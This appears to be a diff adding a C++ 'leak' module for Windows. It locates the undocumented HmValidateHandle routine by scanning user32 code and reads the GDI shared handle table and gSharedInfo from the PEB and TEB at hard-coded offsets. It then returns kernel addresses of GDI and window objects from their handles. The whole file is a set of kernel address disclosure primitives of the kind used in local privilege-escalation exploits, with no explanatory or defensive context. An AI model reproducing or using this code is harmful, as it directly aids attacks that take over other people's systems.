@@ -1,0 +1,101 @@
+#include"leak.h"
+
+
+
+
+
+
+
+
+
+
+
+leak::leak()
+{
+	GetXXXHmValidateHandle();
+	GetGdiSharedHandleTable();
+	Get_gSharedInfo_ulClientDelta();
+}
+
+void leak::GetXXXHmValidateHandle()
+{
+
+	auto hModule = LoadLibrary(L"user32.dll");
+	auto func = GetProcAddress(hModule, "IsMenu");
+	for (size_t i = 0; i < 0x1000; i++)
+	{
+		BYTE* test = (BYTE*)func + i;
+		if (*test == 0xE8)
+		{
+#ifdef _AMD64_
+			ULONG_PTR tmp = (ULONG_PTR)((ULONG_PTR) * (PULONG)(test + 1) | 0xffffffff00000000);
+#else
+			ULONG_PTR tmp = (ULONG_PTR) * (PULONG)(test + 1);
+#endif 
+			HmValidateHandle = (_xxxHmValidateHandle)(test + tmp + 5);
+			break;
+		}
+	}
+	return;
+}
+
+void leak::GetGdiSharedHandleTable()
+{
+	PULONG_PTR teb = (PULONG_PTR)NtCurrentTeb();
+
+#ifdef _AMD64_
+	PULONG_PTR  peb = *(PULONG_PTR*)((PBYTE)teb + 0x60);
+	GdiSharedHandleTable = (pGdiCell) * (PULONG_PTR*)((PBYTE)peb + 0xf8);
+#else
+	PULONG_PTR  peb = *(PULONG_PTR*)((PBYTE)teb + 0x30);
+	GdiSharedHandleTable = (pGdiCell) * (PULONG_PTR*)((PBYTE)peb + 0x94);
+#endif
+
+	return;
+}
+
+void leak::Get_gSharedInfo_ulClientDelta()
+{
+	auto pMenu = CreateMenu();
+
+	/* get g_DeltaDesktopHeap */
+	ULONG_PTR Teb = (ULONG_PTR)NtCurrentTeb();
+#ifdef _AMD64_
+	g_DeltaDesktopHeap = *(ULONG_PTR*)(Teb + 0x800 + 0x28);   //teb->Win32ClientInfo.ulClientDelta
+#else
+	g_DeltaDesktopHeap = *(ULONG_PTR*)(Teb + 0x6CC + 0x1C);
+#endif 
+
+	auto hModule = GetModuleHandleW(L"user32.dll");
+	gSharedInfo = reinterpret_cast<PtagSharedInfo>(GetProcAddress(hModule, "gSharedInfo"));
+
+	DestroyMenu(pMenu);
+}
+
+PVOID leak::GetGdiKernelAddress(HANDLE hGdi)
+{
+	return (GdiSharedHandleTable + LOWORD(hGdi))->pKernelAddress;
+}
+
+PVOID  leak::GetUserObjectAddressBygSharedInfo(HANDLE hWnd, PULONG_PTR UserAddr)
+{
+	PVOID ret = nullptr;
+	pHandleEntry tmp = nullptr;
+
+	for (ULONG_PTR i = 0; i < gSharedInfo->psi->cHandleEntries; i++)
+	{
+		tmp = gSharedInfo->aheList + i;
+		HANDLE handle = reinterpret_cast<HANDLE>(tmp->wUniq << 0x10 | i);
+		if (handle == hWnd)
+		{
+			ret = tmp->phead;
+			if (UserAddr != NULL)
+			{
+				*UserAddr = (ULONG_PTR)ret - g_DeltaDesktopHeap;
+			}
+
+		}
+	}
+
+	return ret;
+}
